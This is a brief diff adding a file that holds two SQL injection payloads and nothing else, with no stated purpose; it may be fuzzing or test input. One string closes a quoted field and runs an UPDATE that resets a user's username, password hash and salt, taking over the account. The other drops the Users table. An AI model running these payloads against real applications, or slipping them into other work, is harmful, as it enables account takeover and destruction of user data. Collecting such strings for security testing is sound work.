@@ -1,0 +1,4 @@
+'; UPDATE Users SET Username = 'Bob', PasswordHash = '3+thm5xNrzwp8/uQ1vxIe6d/K3HoRAeyebX3xEj8SM4=', Salt = 'u1NtkyeLp77WDcL4f6EYgQ==' --
+
+
+'; DROP TABLE Users --
